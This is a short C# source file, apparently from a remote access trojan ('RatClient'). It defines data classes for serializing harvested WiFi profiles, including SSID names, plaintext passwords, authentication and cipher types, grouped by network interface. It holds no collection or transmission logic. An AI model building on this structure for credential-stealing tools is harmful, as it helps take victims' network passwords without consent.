
namespace RatClient.WifiGather
{
	class WifiuniqSerialized
	{
		public string SSIDName { get; set; }
		public string Password { get; set; }
		public string Authentication { get; set; }
		public string Cipher { get; set; }
		public WifiuniqSerialized(string SSIDName, string Password, string Authentication, string Cipher)
		{
			this.SSIDName = SSIDName;
			this.Password = Password;
			this.Authentication = Authentication;
			this.Cipher = Cipher;
		}
	}
	class WifiInterfaceInfo
	{
		public string InterfaceName { get; set; }
		public WifiuniqSerialized[] interfaceProfilesInfo { get; set; }
		public WifiInterfaceInfo(string interfaceName, WifiuniqSerialized[] interfaceProfilesInfo)
		{
			InterfaceName = interfaceName;
			this.interfaceProfilesInfo = interfaceProfilesInfo;
		}
	}

	class WifiFullSerialized
	{
		public WifiInterfaceInfo[] wifiInterfaces { get; set; }

		public WifiFullSerialized(WifiInterfaceInfo[] wifiInterfaces)
		{
			this.wifiInterfaces = wifiInterfaces;
		}
	}
}
